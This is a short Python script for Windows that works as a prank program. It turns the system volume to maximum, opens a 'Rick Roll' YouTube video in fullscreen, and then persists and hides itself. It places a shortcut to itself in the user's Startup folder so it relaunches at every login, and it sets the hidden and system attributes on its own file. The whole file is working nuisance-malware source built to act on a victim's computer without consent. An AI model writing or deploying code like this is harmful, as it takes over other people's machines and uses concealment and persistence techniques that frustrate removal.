from pynput.keyboard import Key, Controller
from win32com.client import Dispatch
import webbrowser, sys, os, time

file = sys.argv[0]

def hide():
    os.system(f'attrib +s +h "{file}"')

def shortcut():
    lnk_name = f"{os.path.splitext(os.path.basename(file))[0]}.lnk"
    lnk_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{lnk_name}"

    shell = Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(lnk_path)
    shortcut.Targetpath = file
    shortcut.save()

def rickroll():
    keyboard = Controller()

    for i in range(50):
        keyboard.press(Key.media_volume_up)
        keyboard.release(Key.media_volume_up)

    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

    time.sleep(1)

    keyboard.press(Key.f11)

rickroll()
shortcut()
hide()